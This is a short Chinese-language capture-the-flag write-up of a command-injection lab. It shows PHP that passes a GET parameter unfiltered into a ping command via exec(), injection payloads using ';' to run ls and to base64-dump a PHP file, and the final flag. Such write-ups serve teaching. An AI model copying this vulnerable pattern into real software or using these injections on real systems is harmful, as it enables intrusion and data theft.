## 漏洞分析
访问靶机首页，页面提供了一个 Ping 的输入框。查看页面下方的源码：
<?php $res = FALSE; if (isset($_GET['ip']) && $_GET['ip']) { $cmd = "ping -c 4 {$_GET['ip']}"; exec($cmd, $res); } ?>

### 漏洞点：
代码直接使用 $_GET['ip'] 拼接到 ping 命令中，没有任何过滤。我们可以利用 Linux 的命令分隔符（如 ;、|、&）来截断原本的 ping 命令，并在后面追加执行任意系统命令

## 解题步骤

### 第一步：探测目录
在浏览器地址栏构造 Payload（利用 ; 截断）：
http://靶机地址/?ip=127.0.0.1;ls
页面 print_r($res) 处回显了当前目录下的文件：
174892261929952.php 和 index.php。

### 第二步：读取目标文件（踩坑与绕过）
尝试直接 cat 174892261929952.php 时，页面没有显示任何内容。这是因为：
1. exec() 函数默认只返回命令执行的最后一行。
2. 文件中的 <?php ... ?> 标签被浏览器当作 HTML 标签解析并隐藏了。

### 第三步：Base64 编码读取
为了绕过 HTML 解析并完整获取文件内容，使用 Linux 的 base64 命令对文件进行编码输出：
http://靶机地址/?ip=127.0.0.1;base64 174892261929952.php
页面回显了一串 Base64 密文。将这段密文复制到在线 Base64 解码工具，成功获取到 Flag：

### ctfhub{c01696761cf611cb66ee818c}
